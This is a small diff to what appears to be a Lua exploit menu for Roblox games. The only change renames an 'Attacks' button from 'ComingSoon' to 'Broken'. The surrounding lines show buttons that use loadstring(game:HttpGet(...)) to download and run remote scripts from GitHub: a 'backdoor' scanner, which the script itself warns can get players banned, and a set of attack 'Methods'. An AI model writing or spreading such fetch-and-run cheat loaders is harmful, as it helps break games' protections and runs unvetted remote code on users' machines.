@@ -24,7 +24,7 @@ MainSection:NewButton("Backdoor", "BackDoorScanner you can be banned in some gam
     loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();
 end)
 
-MainSection:NewButton("ComingSoon", "Attacks", function()
+MainSection:NewButton("Broken", "Attacks", function()
     -- Methods
 local Methods = loadstring(game:HttpGet("https://raw.githubusercontent.com/coolsk8rboy/The-John-Cena-Factory/main/JohnCenasMain.lua"))()
 -- Setup
